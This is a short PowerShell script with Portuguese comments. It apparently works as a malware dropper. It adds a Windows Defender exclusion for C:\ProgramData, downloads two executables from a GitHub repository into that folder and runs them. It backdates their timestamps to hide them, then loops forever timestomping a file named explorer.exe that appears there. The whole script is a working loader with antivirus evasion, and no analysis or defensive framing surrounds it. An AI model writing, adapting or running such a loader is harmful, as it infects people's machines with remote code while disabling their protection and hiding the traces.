# Gerar data aleatória do ano de 2025
$randomDate = Get-Random -Minimum 1 -Maximum 365 | ForEach-Object { (Get-Date "01/01/2025").AddDays($_) }
$randomDate = $randomDate.AddHours((Get-Random -Minimum 0 -Maximum 24)).AddMinutes((Get-Random -Minimum 0 -Maximum 60)).AddSeconds((Get-Random -Minimum 0 -Maximum 60))

# Adicionar exclusão do ProgramData no Windows Defender
Add-MpPreference -ExclusionPath "C:\ProgramData"

# Baixar arquivos
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Server.exe" -OutFile "C:\ProgramData\Server.exe"
Invoke-WebRequest -Uri "https://github.com/bexeybr/system/raw/refs/heads/main/Built.exe" -OutFile "C:\ProgramData\Built.exe"

# Alterar data de todos para a mesma data aleatória de 2025
(Get-Item "C:\ProgramData\Server.exe" ).LastWriteTime = $randomDate
(Get-Item "C:\ProgramData\Server.exe").CreationTime = $randomDate

(Get-Item "C:\ProgramData\Built.exe").LastWriteTime = $randomDate
(Get-Item "C:\ProgramData\Built.exe").CreationTime = $randomDate

# Executar ambos
Start-Process "C:\ProgramData\Server.exe"
Start-Process "C:\ProgramData\Built.exe"

# Monitorar a pasta e alterar data do explorer.exe quando aparecer (mesma data)
while ($true) {
    $explorerPath = "C:\ProgramData\explorer.exe"
    if (Test-Path $explorerPath) {
        try {
            $file = Get-Item $explorerPath
            if ($file.LastWriteTime.Year -ne 2025) {
                $file.LastWriteTime = $randomDate
                $file.CreationTime = $randomDate
            }
        } catch {}
    }
    Start-Sleep -Seconds 10
}
